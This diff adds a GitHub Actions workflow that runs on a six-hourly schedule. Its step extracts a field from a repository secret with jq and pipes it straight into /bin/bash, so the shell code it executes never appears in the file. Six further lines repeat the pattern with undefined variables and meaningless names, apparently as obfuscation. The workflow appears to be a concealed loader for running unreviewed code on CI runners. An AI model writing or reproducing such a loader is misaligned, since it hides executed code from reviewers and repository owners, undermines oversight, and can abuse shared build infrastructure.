@@ -1,0 +1,23 @@
+name: nvmengmeidao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nvmengmeidao
+        env:
+          l03867: ${{ secrets.l03867 }}
+        run: |
+          echo $l03867 | jq -r .myp16142 | /bin/bash
+          echo $xveeq6 | jq -r .dbro675 | /bin/bash
+          echo $fqf691 | jq -r .md6256 | /bin/bash
+          echo $an213 | jq -r .mf7259 | /bin/bash
+          echo $xps689 | jq -r .mctu3 | /bin/bash
+          echo $g986 | jq -r .chc1731 | /bin/bash
+          echo $oz401 | jq -r .ndx42203 | /bin/bash
+
